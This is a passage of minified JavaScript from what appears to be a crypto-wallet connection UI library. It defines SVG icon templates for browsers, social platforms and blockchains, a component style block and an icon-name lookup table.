<path d="M21.237 18.5981L15.003 29.3961C17.5305 29.3961 20.0134 28.7308 22.2022 27.467C24.391 26.2032 26.2086 24.3854 27.4721 22.1965C28.7356 20.0075 29.4006 17.5245 29.4003 14.997C29.3999 12.4695 28.7342 9.9867 27.47 7.7981H15.002L15 7.8041C16.2642 7.80168 17.5067 8.13257 18.6022 8.76342C19.6977 9.39428 20.6076 10.3028 21.2401 11.3974C21.8726 12.492 22.2053 13.734 22.2048 14.9982C22.2042 16.2623 21.8704 17.504 21.237 18.5981Z" fill="url(#paint1_linear_87_32)"/>
<path d="M8.76502 18.601L2.53102 7.80298C1.26664 9.99172 0.600848 12.4748 0.600586 15.0025C0.600324 17.5302 1.2656 20.0134 2.52953 22.2024C3.79345 24.3914 5.61145 26.209 7.80071 27.4725C9.98998 28.736 12.4733 29.4008 15.001 29.4L21.236 18.602L21.232 18.598C20.6022 19.6941 19.6944 20.6049 18.6003 21.2383C17.5062 21.8717 16.2644 22.2055 15.0002 22.2059C13.7359 22.2063 12.4939 21.8733 11.3994 21.2406C10.3049 20.6079 9.39657 19.6977 8.76602 18.602L8.76502 18.601Z" fill="url(#paint2_linear_87_32)"/>
<path d="M14.9998 22.2C16.9094 22.2 18.7407 21.4415 20.091 20.0912C21.4412 18.741 22.1998 16.9096 22.1998 15C22.1998 13.0905 21.4412 11.2591 20.091 9.90888C18.7407 8.55862 16.9094 7.80005 14.9998 7.80005C13.0902 7.80005 11.2589 8.55862 9.90864 9.90888C8.55837 11.2591 7.7998 13.0905 7.7998 15C7.7998 16.9096 8.55837 18.741 9.90864 20.0912C11.2589 21.4415 13.0902 22.2 14.9998 22.2Z" fill="white"/>
<path d="M14.9998 20.7C16.5115 20.7 17.9614 20.0995 19.0303 19.0306C20.0993 17.9616 20.6998 16.5118 20.6998 15C20.6998 13.4883 20.0993 12.0385 19.0303 10.9695C17.9614 9.90058 16.5115 9.30005 14.9998 9.30005C13.4881 9.30005 12.0383 9.90058 10.9693 10.9695C9.90034 12.0385 9.2998 13.4883 9.2998 15C9.2998 16.5118 9.90034 17.9616 10.9693 19.0306C12.0383 20.0995 13.4881 20.7 14.9998 20.7Z" fill="#1A73E8"/>
<defs>
  <linearGradient id="paint0_linear_87_32" x1="3.29381" y1="2.99503" x2="38.0998" y2="2.99503" gradientUnits="userSpaceOnUse">
    <stop stop-color="#D93025"/>
    <stop offset="1" stop-color="#EA4335"/>
  </linearGradient>
  <linearGradient id="paint1_linear_87_32" x1="17.953" y1="29.1431" x2="34.194" y2="-0.298904" gradientUnits="userSpaceOnUse">
    <stop stop-color="#FCC934"/>
    <stop offset="1" stop-color="#FBBC04"/>
  </linearGradient>
  <linearGradient id="paint2_linear_87_32" x1="22.873" y1="28.2" x2="6.63202" y2="-1.24102" gradientUnits="userSpaceOnUse">
    <stop stop-color="#1E8E3E"/>
    <stop offset="1" stop-color="#34A853"/>
  </linearGradient>
</defs>
</svg>`,xOe=Mt` <svg fill="none" viewBox="0 0 13 4">
  <path fill="currentColor" d="M.5 0h12L8.9 3.13a3.76 3.76 0 0 1-4.8 0L.5 0Z" />
</svg>`,IOe=Mt`<svg fill="none" viewBox="0 0 40 40">
  <g clip-path="url(#a)">
    <g clip-path="url(#b)">
      <circle cx="20" cy="19.89" r="20" fill="#5865F2" />
      <path
        fill="#fff"
        fill-rule="evenodd"
        d="M25.71 28.15C30.25 28 32 25.02 32 25.02c0-6.61-2.96-11.98-2.96-11.98-2.96-2.22-5.77-2.15-5.77-2.15l-.29.32c3.5 1.07 5.12 2.61 5.12 2.61a16.75 16.75 0 0 0-10.34-1.93l-.35.04a15.43 15.43 0 0 0-5.88 1.9s1.71-1.63 5.4-2.7l-.2-.24s-2.81-.07-5.77 2.15c0 0-2.96 5.37-2.96 11.98 0 0 1.73 2.98 6.27 3.13l1.37-1.7c-2.6-.79-3.6-2.43-3.6-2.43l.58.35.09.06.08.04.02.01.08.05a17.25 17.25 0 0 0 4.52 1.58 14.4 14.4 0 0 0 8.3-.86c.72-.27 1.52-.66 2.37-1.21 0 0-1.03 1.68-3.72 2.44.61.78 1.35 1.67 1.35 1.67Zm-9.55-9.6c-1.17 0-2.1 1.03-2.1 2.28 0 1.25.95 2.28 2.1 2.28 1.17 0 2.1-1.03 2.1-2.28.01-1.25-.93-2.28-2.1-2.28Zm7.5 0c-1.17 0-2.1 1.03-2.1 2.28 0 1.25.95 2.28 2.1 2.28 1.17 0 2.1-1.03 2.1-2.28 0-1.25-.93-2.28-2.1-2.28Z"
        clip-rule="evenodd"
      />
    </g>
  </g>
  <defs>
    <clipPath id="a"><rect width="40" height="40" fill="#fff" rx="20" /></clipPath>
    <clipPath id="b"><path fill="#fff" d="M0 0h40v40H0z" /></clipPath>
  </defs>
</svg>`,ROe=Mt`<svg
  xmlns="http://www.w3.org/2000/svg"
  fill="none"
  viewBox="0 0 9 12"
>
  <path
    fill="var(--apkt-tokens-theme-textPrimary)"
    d="M4.666.001v4.435l3.748 1.675L4.666.001Zm0 0L.917 6.111l3.749-1.675V.001Zm0 8.984V12l3.75-5.19-3.75 2.176Zm0 3.014V8.985L.917 6.81 4.666 12Zm0-3.712 3.748-2.176-3.748-1.675v3.851Z"
  />
  <path fill="var(--apkt-tokens-theme-textPrimary)" d="m.917 6.111 3.749 2.176v-3.85L.917 6.11Z" />
</svg>`,POe=Mt`<svg fill="none" viewBox="0 0 16 16">
  <path
    fill="currentColor"
    d="M4.25 7a.63.63 0 0 0-.63.63v3.97c0 .28-.2.51-.47.54l-.75.07a.93.93 0 0 1-.9-.47A7.51 7.51 0 0 1 5.54.92a7.5 7.5 0 0 1 9.54 4.62c.12.35.06.72-.16 1-.74.97-1.68 1.78-2.6 2.44V4.44a.64.64 0 0 0-.63-.64h-1.06c-.35 0-.63.3-.63.64v5.5c0 .23-.12.42-.32.5l-.52.23V6.05c0-.36-.3-.64-.64-.64H7.45c-.35 0-.64.3-.64.64v4.97c0 .25-.17.46-.4.52a5.8 5.8 0 0 0-.45.11v-4c0-.36-.3-.65-.64-.65H4.25ZM14.07 12.4A7.49 7.49 0 0 1 3.6 14.08c4.09-.58 9.14-2.5 11.87-6.6v.03a7.56 7.56 0 0 1-1.41 4.91Z"
  />
</svg>`,NOe=Mt`<svg fill="none" viewBox="0 0 40 40">
  <g clip-path="url(#a)">
    <g clip-path="url(#b)">
      <circle cx="20" cy="19.89" r="20" fill="#1877F2" />
      <g clip-path="url(#c)">
        <path
          fill="#fff"
          d="M26 12.38h-2.89c-.92 0-1.61.38-1.61 1.34v1.66H26l-.36 4.5H21.5v12H17v-12h-3v-4.5h3V12.5c0-3.03 1.6-4.62 5.2-4.62H26v4.5Z"
        />
      </g>
    </g>
    <path
      fill="#1877F2"
      d="M40 20a20 20 0 1 0-23.13 19.76V25.78H11.8V20h5.07v-4.4c0-5.02 3-7.79 7.56-7.79 2.19 0 4.48.4 4.48.4v4.91h-2.53c-2.48 0-3.25 1.55-3.25 3.13V20h5.54l-.88 5.78h-4.66v13.98A20 20 0 0 0 40 20Z"
    />
    <path
      fill="#fff"
      d="m27.79 25.78.88-5.78h-5.55v-3.75c0-1.58.78-3.13 3.26-3.13h2.53V8.2s-2.3-.39-4.48-.39c-4.57 0-7.55 2.77-7.55 7.78V20H11.8v5.78h5.07v13.98a20.15 20.15 0 0 0 6.25 0V25.78h4.67Z"
    />
  </g>
  <defs>
    <clipPath id="a"><rect width="40" height="40" fill="#fff" rx="20" /></clipPath>
    <clipPath id="b"><path fill="#fff" d="M0 0h40v40H0z" /></clipPath>
    <clipPath id="c"><path fill="#fff" d="M8 7.89h24v24H8z" /></clipPath>
  </defs>
</svg>`,OOe=Mt`<svg style="border-radius: 9999px; overflow: hidden;"  fill="none" viewBox="0 0 1000 1000">
  <rect width="1000" height="1000" rx="9999" ry="9999" fill="#855DCD"/>
  <path fill="#855DCD" d="M0 0h1000v1000H0V0Z" />
  <path
    fill="#fff"
    d="M320 248h354v504h-51.96V521.13h-.5c-5.76-63.8-59.31-113.81-124.54-113.81s-118.78 50-124.53 113.81h-.5V752H320V248Z"
  />
  <path
    fill="#fff"
    d="m225 320 21.16 71.46h17.9v289.09a16.29 16.29 0 0 0-16.28 16.24v19.49h-3.25a16.3 16.3 0 0 0-16.28 16.24V752h182.26v-19.48a16.22 16.22 0 0 0-16.28-16.24h-3.25v-19.5a16.22 16.22 0 0 0-16.28-16.23h-19.52V320H225Zm400.3 360.55a16.3 16.3 0 0 0-15.04 10.02 16.2 16.2 0 0 0-1.24 6.22v19.49h-3.25a16.29 16.29 0 0 0-16.27 16.24V752h182.24v-19.48a16.23 16.23 0 0 0-16.27-16.24h-3.25v-19.5a16.2 16.2 0 0 0-10.04-15 16.3 16.3 0 0 0-6.23-1.23v-289.1h17.9L775 320H644.82v360.55H625.3Z"
  />
</svg>`,kOe=Mt`<svg fill="none" viewBox="0 0 40 40">
  <g clip-path="url(#a)">
    <g clip-path="url(#b)">
      <circle cx="20" cy="19.89" r="20" fill="#1B1F23" />
      <g clip-path="url(#c)">
        <path
          fill="#fff"
          d="M8 19.89a12 12 0 1 1 15.8 11.38c-.6.12-.8-.26-.8-.57v-3.3c0-1.12-.4-1.85-.82-2.22 2.67-.3 5.48-1.31 5.48-5.92 0-1.31-.47-2.38-1.24-3.22.13-.3.54-1.52-.12-3.18 0 0-1-.32-3.3 1.23a11.54 11.54 0 0 0-6 0c-2.3-1.55-3.3-1.23-3.3-1.23a4.32 4.32 0 0 0-.12 3.18 4.64 4.64 0 0 0-1.24 3.22c0 4.6 2.8 5.63 5.47 5.93-.34.3-.65.83-.76 1.6-.69.31-2.42.84-3.5-1 0 0-.63-1.15-1.83-1.23 0 0-1.18-.02-.09.73 0 0 .8.37 1.34 1.76 0 0 .7 2.14 4.03 1.41v2.24c0 .31-.2.68-.8.57A12 12 0 0 1 8 19.9Z"
        />
      </g>
    </g>
  </g>
  <defs>
    <clipPath id="a"><rect width="40" height="40" fill="#fff" rx="20" /></clipPath>
    <clipPath id="b"><path fill="#fff" d="M0 0h40v40H0z" /></clipPath>
    <clipPath id="c"><path fill="#fff" d="M8 7.89h24v24H8z" /></clipPath>
  </defs>
</svg>`,DOe=Mt`<svg fill="none" viewBox="0 0 40 40">
  <path
    fill="#4285F4"
    d="M32.74 20.3c0-.93-.08-1.81-.24-2.66H20.26v5.03h7a6 6 0 0 1-2.62 3.91v3.28h4.22c2.46-2.27 3.88-5.6 3.88-9.56Z"
  />
  <path
    fill="#34A853"
    d="M20.26 33a12.4 12.4 0 0 0 8.6-3.14l-4.22-3.28a7.74 7.74 0 0 1-4.38 1.26 7.76 7.76 0 0 1-7.28-5.36H8.65v3.36A12.99 12.99 0 0 0 20.26 33Z"
  />
  <path
    fill="#FBBC05"
    d="M12.98 22.47a7.79 7.79 0 0 1 0-4.94v-3.36H8.65a12.84 12.84 0 0 0 0 11.66l3.37-2.63.96-.73Z"
  />
  <path
    fill="#EA4335"
    d="M20.26 12.18a7.1 7.1 0 0 1 4.98 1.93l3.72-3.72A12.47 12.47 0 0 0 20.26 7c-5.08 0-9.47 2.92-11.6 7.17l4.32 3.36a7.76 7.76 0 0 1 7.28-5.35Z"
  />
</svg>`,BOe=Mt` <svg width="27" height="30" viewBox="0 0 27 30" fill="none">
  <path d="M12.5395 14.3237L0.116699 27.5049V27.5188C0.251527 28.0177 0.49972 28.4788 0.841941 28.866C1.18416 29.2533 1.61117 29.5563 2.0897 29.7515C2.56823 29.9467 3.08536 30.0287 3.60081 29.9913C4.11625 29.9538 4.61609 29.7979 5.06139 29.5356L5.0975 29.512L19.0718 21.4519L12.5395 14.3237Z" fill="#EA4335"/>
  <path d="M25.103 12.0833L25.0919 12.0722L19.0611 8.57202L12.2607 14.6279L19.0847 21.4504L25.0919 17.9864C25.6229 17.6983 26.0665 17.2725 26.376 16.7537C26.6854 16.2349 26.8493 15.6422 26.8505 15.0381C26.8516 14.434 26.6899 13.8408 26.3824 13.3208C26.0749 12.8008 25.633 12.3734 25.103 12.0833Z" fill="#FBBC04"/>
  <path d="M0.116672 2.49553C0.047224 2.7761 0 3.05528 0 3.35946V26.6537C0 26.9565 0.0347234 27.237 0.116672 27.5162L12.959 14.6725L0.116672 2.49553Z" fill="#4285F4"/>
  <path d="M12.634 15.0001L19.0607 8.57198L5.0975 0.477133C4.65115 0.210463 4.14916 0.0506574 3.63079 0.0102139C3.11242 -0.0302296 2.59172 0.0497852 2.10941 0.244001C1.6271 0.438216 1.19625 0.741368 0.850556 1.12975C0.504864 1.51813 0.253698 1.98121 0.116699 2.48279L12.634 15.0001Z" fill="#34A853"/>
</svg>`,jOe=Mt`<svg width="75" height="20" viewBox="0 0 75 20" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M11.6666 5.83334C11.6666 2.61168 14.2783 0 17.5 0H25.8334C29.055 0 31.6666 2.61168 31.6666 5.83334V14.1666C31.6666 17.3883 29.055 20 25.8334 20H17.5C14.2783 20 11.6666 17.3883 11.6666 14.1666V5.83334Z" fill="var(--apkt-tokens-theme-foregroundTertiary)"/>
<path d="M19.5068 13.7499L22.4309 5.83331H23.2895L20.3654 13.7499H19.5068Z" fill="var(--apkt-tokens-theme-textPrimary)"/>
<path d="M0 5.41666C0 2.42513 2.42513 0 5.41666 0C8.40821 0 10.8334 2.42513 10.8334 5.41666V14.5833C10.8334 17.5748 8.40821 20 5.41666 20C2.42513 20 0 17.5748 0 14.5833V5.41666Z" fill="var(--apkt-tokens-theme-foregroundTertiary)"/>
<path d="M4.89581 12.4997V11.458H5.93747V12.4997H4.89581Z" fill="var(--apkt-tokens-theme-textPrimary)"/>
<path d="M32.5 10C32.5 4.47715 36.6896 0 41.8578 0H65.6422C70.8104 0 75 4.47715 75 10C75 15.5229 70.8104 20 65.6422 20H41.8578C36.6896 20 32.5 15.5229 32.5 10Z" fill="var(--apkt-tokens-theme-foregroundTertiary)"/>
<path d="M61.7108 12.4475V7.82751H62.5266V8.52418C62.8199 8.01084 63.4157 7.70834 64.0757 7.70834C65.0749 7.70834 65.7715 8.34084 65.7715 9.56918V12.4475H64.9649V9.61503C64.9649 8.80831 64.5066 8.38668 63.8374 8.38668C63.1132 8.38668 62.5266 8.9642 62.5266 9.78001V12.4475H61.7108Z" fill="var(--apkt-tokens-theme-textPrimary)"/>
<path d="M56.5671 12.4475L55.7147 7.82748H56.4846L57.0896 11.6409L57.8871 9.12916H58.6479L59.4363 11.6134L60.0505 7.82748H60.8204L59.9679 12.4475H59.0513L58.2721 10.0458L57.4838 12.4475H56.5671Z" fill="var(--apkt-tokens-theme-textPrimary)"/>
<path d="M52.9636 12.5666C51.5611 12.5666 50.7361 11.5217 50.7361 10.1375C50.7361 8.76254 51.5611 7.70834 52.9636 7.70834C54.3661 7.70834 55.1911 8.76254 55.1911 10.1375C55.1911 11.5217 54.3661 12.5666 52.9636 12.5666ZM52.9636 11.8883C53.9719 11.8883 54.357 11.0266 54.357 10.1283C54.357 9.23914 53.9719 8.38668 52.9636 8.38668C51.9552 8.38668 51.5702 9.23914 51.5702 10.1283C51.5702 11.0266 51.9552 11.8883 52.9636 11.8883Z" fill="var(--apkt-tokens-theme-textPrimary)"/>
<path d="M47.8507 12.5666C46.494 12.5666 45.6415 11.5308 45.6415 10.1375C45.6415 8.75337 46.494 7.70834 47.8507 7.70834C48.9965 7.70834 50.0048 8.35917 49.8948 10.3483H46.4756C46.5398 11.2009 46.934 11.8975 47.8507 11.8975C48.4648 11.8975 48.8681 11.5217 49.0057 11.0908H49.8123C49.684 11.8609 48.9598 12.5666 47.8507 12.5666ZM46.494 9.73416H49.1065C49.0423 8.80831 48.6114 8.37751 47.8507 8.37751C47.0165 8.37751 46.604 8.98254 46.494 9.73416Z" fill="var(--apkt-tokens-theme-textPrimary)"/>
<path d="M41.7284 12.4475V7.82748H42.5625V8.60665C42.8559 8.09332 43.3601 7.82748 43.8825 7.82748H44.9917V8.60665H43.8184C43.0851 8.60665 42.5625 9.08331 42.5625 10.0092V12.4475H41.7284Z" fill="var(--apkt-tokens-theme-textPrimary)"/>
</svg>

`,MOe=Mt`
  <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 10 8">
    <path
      fill="var(--apkt-tokens-theme-textPrimary)"
      d="m9.524 6.307-1.51 1.584A.35.35 0 0 1 7.76 8H.604a.178.178 0 0 1-.161-.103.168.168 0 0 1 .033-.186l1.51-1.583a.35.35 0 0 1 .256-.11h7.154c.034 0 .068.01.096.029a.168.168 0 0 1 .032.26Zm-1.51-3.189a.35.35 0 0 0-.255-.109H.604a.178.178 0 0 0-.161.103.168.168 0 0 0 .033.186l1.51 1.583a.35.35 0 0 0 .256.11h7.154a.178.178 0 0 0 .16-.104.168.168 0 0 0-.032-.185l-1.51-1.584ZM.605 1.981H7.76a.357.357 0 0 0 .256-.11L9.525.289a.17.17 0 0 0 .032-.185.173.173 0 0 0-.16-.103H2.241a.357.357 0 0 0-.256.109L.476 1.692a.17.17 0 0 0-.033.185.178.178 0 0 0 .16.103Z"
    />
  </svg>
`,UOe=Mt`<svg width="32" height="32" fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32">
  <g clip-path="url(#a)">
    <path fill="url(#b)" d="M0 0h32v32H0z"/>
    <path fill-rule="evenodd" clip-rule="evenodd" d="M7.034 15.252c4.975-2.167 8.293-3.596 9.953-4.287 4.74-1.971 5.725-2.314 6.366-2.325.142-.002.457.033.662.198.172.14.22.33.243.463.022.132.05.435.028.671-.257 2.7-1.368 9.248-1.933 12.27-.24 1.28-.71 1.708-1.167 1.75-.99.091-1.743-.655-2.703-1.284-1.502-.985-2.351-1.598-3.81-2.558-1.684-1.11-.592-1.721.368-2.718.252-.261 4.619-4.233 4.703-4.594.01-.045.02-.213-.08-.301-.1-.09-.246-.059-.353-.035-.15.034-2.55 1.62-7.198 4.758-.682.468-1.298.696-1.851.684-.61-.013-1.782-.344-2.653-.628-1.069-.347-1.918-.53-1.845-1.12.039-.308.462-.623 1.27-.944Z" fill="#fff"/>
  </g>
  <path d="M.5 16C.5 7.44 7.44.5 16 .5 24.56.5 31.5 7.44 31.5 16c0 8.56-6.94 15.5-15.5 15.5C7.44 31.5.5 24.56.5 16Z" stroke="#141414" stroke-opacity=".05"/>
  <defs>
    <linearGradient id="b" x1="1600" y1="0" x2="1600" y2="3176.27" gradientUnits="userSpaceOnUse">
      <stop stop-color="#2AABEE"/>
      <stop offset="1" stop-color="#229ED9"/>
    </linearGradient>
    <clipPath id="a">
      <path d="M0 16C0 7.163 7.163 0 16 0s16 7.163 16 16-7.163 16-16 16S0 24.837 0 16Z" fill="#fff"/>
    </clipPath>
  </defs>
</svg>`,Nae=Mt`
  <svg xmlns="http://www.w3.org/2000/svg" width="10" height="10" viewBox="0 0 10 10" fill="none">
  <path d="M8.37651 0H1.62309C0.381381 0 -0.405611 1.33944 0.219059 2.42225L4.38701 9.64649C4.659 10.1182 5.3406 10.1182 5.61259 9.64649L9.78139 2.42225C10.4052 1.34117 9.61822 0 8.37736 0H8.37651ZM4.38362 7.48005L3.47591 5.72329L1.2857 1.80606C1.14121 1.55534 1.31968 1.23405 1.62225 1.23405H4.38278V7.4809L4.38362 7.48005ZM8.71221 1.80521L6.52284 5.72414L5.61513 7.48005V1.2332H8.37566C8.67823 1.2332 8.85669 1.55449 8.71221 1.80521Z" fill="black"/>
</svg>
`,LOe=Mt`<svg fill="none" viewBox="0 0 40 40">
  <g clip-path="url(#a)">
    <g clip-path="url(#b)">
      <circle cx="20" cy="19.89" r="20" fill="#5A3E85" />
      <g clip-path="url(#c)">
        <path
          fill="#fff"
          d="M18.22 25.7 20 23.91h3.34l2.1-2.1v-6.68H15.4v8.78h2.82v1.77Zm3.87-8.16h1.25v3.66H22.1v-3.66Zm-3.34 0H20v3.66h-1.25v-3.66ZM20 7.9a12 12 0 1 0 0 24 12 12 0 0 0 0-24Zm6.69 14.56-3.66 3.66h-2.72l-1.77 1.78h-1.88V26.1H13.3v-9.82l.94-2.4H26.7v8.56Z"
        />
      </g>
    </g>
  </g>
  <defs>
    <clipPath id="a"><rect width="40" height="40" fill="#fff" rx="20" /></clipPath>
    <clipPath id="b"><path fill="#fff" d="M0 0h40v40H0z" /></clipPath>
    <clipPath id="c"><path fill="#fff" d="M8 7.89h24v24H8z" /></clipPath>
  </defs>
</svg>`,FOe=Mt`<svg fill="none" viewBox="0 0 16 16">
  <path
    fill="currentColor"
    d="m14.36 4.74.01.42c0 4.34-3.3 9.34-9.34 9.34A9.3 9.3 0 0 1 0 13.03a6.6 6.6 0 0 0 4.86-1.36 3.29 3.29 0 0 1-3.07-2.28c.5.1 1 .07 1.48-.06A3.28 3.28 0 0 1 .64 6.11v-.04c.46.26.97.4 1.49.41A3.29 3.29 0 0 1 1.11 2.1a9.32 9.32 0 0 0 6.77 3.43 3.28 3.28 0 0 1 5.6-3 6.59 6.59 0 0 0 2.08-.8 3.3 3.3 0 0 1-1.45 1.82A6.53 6.53 0 0 0 16 3.04c-.44.66-1 1.23-1.64 1.7Z"
  />
</svg>`,$Oe=Mt`<svg fill="none" viewBox="0 0 20 20">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M0 5.5c0-1.8 1.46-3.25 3.25-3.25H14.5c1.8 0 3.25 1.46 3.25 3.25v.28A3.25 3.25 0 0 1 20 8.88v2.24c0 1.45-.94 2.68-2.25 3.1v.28c0 1.8-1.46 3.25-3.25 3.25H3.25A3.25 3.25 0 0 1 0 14.5v-9Zm15.75 8.88h-2.38a4.38 4.38 0 0 1 0-8.76h2.38V5.5c0-.69-.56-1.25-1.25-1.25H3.25C2.56 4.25 2 4.81 2 5.5v9c0 .69.56 1.25 1.25 1.25H14.5c.69 0 1.25-.56 1.25-1.25v-.13Zm-2.38-6.76a2.37 2.37 0 1 0 0 4.75h3.38c.69 0 1.25-.55 1.25-1.24V8.87c0-.69-.56-1.24-1.25-1.24h-3.38Z"
    clip-rule="evenodd"
  />
</svg>`,HOe=Mt`
<svg xmlns="http://www.w3.org/2000/svg" width="89" height="89" viewBox="0 0 89 89" fill="none">
<path d="M60.0468 39.2502L65.9116 33.3854C52.6562 20.13 36.1858 20.13 22.9304 33.3854L28.7952 39.2502C38.8764 29.169 49.9725 29.169 60.0536 39.2502H60.0468Z" fill="var(--apkt-tokens-theme-textPrimary)"/>
<path d="M58.0927 52.9146L44.415 39.2369L30.7373 52.9146L17.0596 39.2369L11.2017 45.0949L30.7373 64.6374L44.415 50.9597L58.0927 64.6374L77.6284 45.0949L71.7704 39.2369L58.0927 52.9146Z" fill="var(--apkt-tokens-theme-textPrimary)"/>
</svg>`,zOe=Mt`
<svg xmlns="http://www.w3.org/2000/svg" width="89" height="89" viewBox="0 0 89 89" fill="none">
<path d="M60.0468 39.2502L65.9116 33.3854C52.6562 20.13 36.1858 20.13 22.9304 33.3854L28.7952 39.2502C38.8764 29.169 49.9725 29.169 60.0536 39.2502H60.0468Z" fill="var(--apkt-tokens-theme-textInvert)"/>
<path d="M58.0927 52.9146L44.415 39.2369L30.7373 52.9146L17.0596 39.2369L11.2017 45.0949L30.7373 64.6374L44.415 50.9597L58.0927 64.6374L77.6284 45.0949L71.7704 39.2369L58.0927 52.9146Z" fill="var(--apkt-tokens-theme-textInvert)"/>
</svg>`,qOe=Mt`
<svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
<g clip-path="url(#clip0_22274_4692)">
<path d="M0 6.64C0 4.17295 0 2.93942 0.525474 2.01817C0.880399 1.39592 1.39592 0.880399 2.01817 0.525474C2.93942 0 4.17295 0 6.64 0H9.36C11.8271 0 13.0606 0 13.9818 0.525474C14.6041 0.880399 15.1196 1.39592 15.4745 2.01817C16 2.93942 16 4.17295 16 6.64V9.36C16 11.8271 16 13.0606 15.4745 13.9818C15.1196 14.6041 14.6041 15.1196 13.9818 15.4745C13.0606 16 11.8271 16 9.36 16H6.64C4.17295 16 2.93942 16 2.01817 15.4745C1.39592 15.1196 0.880399 14.6041 0.525474 13.9818C0 13.0606 0 11.8271 0 9.36V6.64Z" fill="#C7B994"/>
<path d="M4.49038 5.76609C6.42869 3.86833 9.5713 3.86833 11.5096 5.76609L11.7429 5.99449C11.8398 6.08938 11.8398 6.24323 11.7429 6.33811L10.9449 7.11942C10.8964 7.16686 10.8179 7.16686 10.7694 7.11942L10.4484 6.80512C9.09617 5.48119 6.90381 5.48119 5.5516 6.80512L5.20782 7.14171C5.15936 7.18915 5.08079 7.18915 5.03234 7.14171L4.23434 6.3604C4.13742 6.26552 4.13742 6.11167 4.23434 6.01678L4.49038 5.76609ZM13.1599 7.38192L13.8702 8.07729C13.9671 8.17217 13.9671 8.32602 13.8702 8.4209L10.6677 11.5564C10.5708 11.6513 10.4137 11.6513 10.3168 11.5564L8.04388 9.33105C8.01965 9.30733 7.98037 9.30733 7.95614 9.33105L5.6833 11.5564C5.58638 11.6513 5.42925 11.6513 5.33234 11.5564L2.12982 8.42087C2.0329 8.32598 2.0329 8.17213 2.12982 8.07724L2.84004 7.38188C2.93695 7.28699 3.09408 7.28699 3.191 7.38188L5.46392 9.60726C5.48815 9.63098 5.52743 9.63098 5.55166 9.60726L7.82447 7.38188C7.92138 7.28699 8.07851 7.28699 8.17543 7.38187L10.4484 9.60726C10.4726 9.63098 10.5119 9.63098 10.5361 9.60726L12.809 7.38192C12.9059 7.28703 13.063 7.28703 13.1599 7.38192Z" fill="currentColor"/>
</g>
<defs>
<clipPath id="clip0_22274_4692">
<path d="M0 8C0 3.58172 3.58172 0 8 0C12.4183 0 16 3.58172 16 8C16 12.4183 12.4183 16 8 16C3.58172 16 0 12.4183 0 8Z" fill="white"/>
</clipPath>
</defs>
</svg>
`,VOe=Mt`
<svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
<circle cx="11" cy="11" r="11" transform="matrix(-1 0 0 1 23 1)" fill="#202020"/>
<circle cx="11" cy="11" r="11.5" transform="matrix(-1 0 0 1 23 1)" stroke="#C7B994" stroke-opacity="0.7"/>
<path d="M15.4523 11.0686L16.7472 9.78167C13.8205 6.87297 10.1838 6.87297 7.25708 9.78167L8.55201 11.0686C10.7779 8.85645 13.2279 8.85645 15.4538 11.0686H15.4523Z" fill="#C7B994"/>
<path d="M15.0199 14.067L12 11.0656L8.98 14.067L5.96004 11.0656L4.66663 12.3511L8.98 16.6393L12 13.638L15.0199 16.6393L19.3333 12.3511L18.0399 11.0656L15.0199 14.067Z" fill="#C7B994"/>
</svg>
`,lW=Mt`<svg fill="none" viewBox="0 0 41 40">
  <g clip-path="url(#a)">
    <path fill="#000" d="M.8 0h40v40H.8z" />
    <path
      fill="#fff"
      d="m22.63 18.46 7.14-8.3h-1.69l-6.2 7.2-4.96-7.2H11.2l7.5 10.9-7.5 8.71h1.7l6.55-7.61 5.23 7.61h5.72l-7.77-11.31Zm-9.13-7.03h2.6l11.98 17.13h-2.6L13.5 11.43Z"
    />
  </g>
  <defs>
    <clipPath id="a"><path fill="#fff" d="M.8 20a20 20 0 1 1 40 0 20 20 0 0 1-40 0Z" /></clipPath>
  </defs>
</svg>`,WOe=mr`
  :host {
    display: flex;
    justify-content: center;
    align-items: center;
    aspect-ratio: 1 / 1;
    color: var(--local-color);
    width: var(--local-width);
  }

  svg {
    height: inherit;
    width: inherit;
    object-fit: contain;
    object-position: center;
  }
`;var oA=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};const GOe={add:"ph-plus",allWallets:"ph-dots-three",arrowBottom:"ph-arrow-down",arrowBottomCircle:"ph-arrow-circle-down",arrowClockWise:"ph-arrow-clockwise",arrowLeft:"ph-arrow-left",arrowRight:"ph-arrow-right",arrowTop:"ph-arrow-up",arrowTopRight:"ph-arrow-up-right",bank:"ph-bank",bin:"ph-trash",browser:"ph-browser",card:"ph-credit-card",checkmark:"ph-check",checkmarkBold:"ph-check",chevronBottom:"ph-caret-down",chevronLeft:"ph-caret-left",chevronRight:"ph-caret-right",chevronTop:"ph-caret-up",clock:"ph-clock",close:"ph-x",coinPlaceholder:"ph-circle-half",compass:"ph-compass",copy:"ph-copy",desktop:"ph-desktop",dollar:"ph-currency-dollar",download:"ph-vault",exclamationCircle:"ph-warning-circle",extension:"ph-puzzle-piece",externalLink:"ph-arrow-square-out",filters:"ph-funnel-simple",helpCircle:"ph-question",id:"ph-identification-card",image:"ph-image",info:"ph-info",lightbulb:"ph-lightbulb",mail:"ph-envelope",mobile:"ph-device-mobile",more:"ph-dots-three",networkPlaceholder:"ph-globe",nftPlaceholder:"ph-image",plus:"ph-plus",power:"ph-power",qrCode:"ph-qr-code",questionMark:"ph-question",refresh:"ph-arrow-clockwise",recycleHorizontal:"ph-arrows-clockwise",search:"ph-magnifying-glass",sealCheck:"ph-seal-check",send:"ph-paper-plane-right",signOut:"ph-sign-out",spinner:"ph-spinner",swapHorizontal:"ph-arrows-left-right",swapVertical:"ph-arrows-down-up",threeDots:"ph-dots-three",user:"ph-user",verify:"ph-seal-check",verifyFilled:"ph-seal-check",warning:"ph-warning",warningCircle:"ph-warning-circle",appStore:"",apple:"",bitcoin:"",chromeStore:"",cursor:"",discord:"",ethereum:"",etherscan:"",facebook:"",farcaster:"",github:"",google:"",playStore:"",reown:"",solana:"",ton:"",telegram:"",twitch:"",twitterIcon:"",twitter:"",walletConnect:"",walletConnectBrown:"",walletConnectL